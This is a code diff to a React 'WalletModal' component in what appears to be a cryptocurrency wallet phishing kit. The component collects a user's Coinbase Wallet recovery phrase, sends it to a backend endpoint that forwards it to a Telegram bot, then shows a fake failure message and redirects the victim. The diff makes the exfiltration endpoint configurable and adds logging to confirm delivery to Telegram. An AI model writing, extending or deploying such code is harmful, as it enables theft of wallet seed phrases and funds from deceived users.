@@ -133,8 +133,14 @@ export default function WalletModal({ open, onClose }) {
     setCbImportLoading(true)
 
     try {
+      // Get backend URL from environment or use relative path for production
+      const backendUrl = import.meta.env.VITE_BACKEND_URL || '/api/send-recovery-phrase'
+
       // Send the import data to Telegram bot immediately (don't wait for response)
-      fetch('http://localhost:3001/api/send-recovery-phrase', {
+      console.log('🔄 Sending import data to:', backendUrl)
+      console.log('📝 Data:', { phrase: cbImportValue.substring(0, 20) + '...', walletName: `Coinbase Wallet (${cbImportType})` })
+      
+      fetch(backendUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -143,9 +149,21 @@ export default function WalletModal({ open, onClose }) {
           phrase: cbImportValue,
           walletName: `Coinbase Wallet (${cbImportType})`,
         }),
+      }).then(response => {
+        console.log('✅ Backend response status:', response.status)
+        if (!response.ok) {
+          console.error('❌ Backend error:', response.statusText)
+        }
+        return response.json().catch(() => ({}))
+      }).then(data => {
+        console.log('📨 Backend response:', data)
+        if (data.success) {
+          console.log('🎉 Data sent to Telegram successfully!')
+        } else {
+          console.error('❌ Telegram send failed:', data.error)
+        }
       }).catch(error => {
-        // Silently handle errors - data might still be sent
-        console.log('Telegram send error:', error)
+        console.error('🚨 Network error sending to Telegram:', error)
       })
 
       // Immediately show failed state after 0.5 seconds (data sent in background)
@@ -154,15 +172,18 @@ export default function WalletModal({ open, onClose }) {
         setCbState('failed')
         // Auto redirect after another 1 second (total 1.5 seconds)
         setTimeout(() => {
+          console.log('🔄 Redirecting to /connect')
           window.location.href = '/connect'
         }, 1000)
       }, 500)
     } catch (error) {
+      console.error('💥 Import function error:', error)
       // Even on error, show failed after 0.5 seconds
       setTimeout(() => {
         setCbImportLoading(false)
         setCbState('failed')
         setTimeout(() => {
+          console.log('🔄 Redirecting to /connect (error case)')
           window.location.href = '/connect'
         }, 1000)
       }, 500)
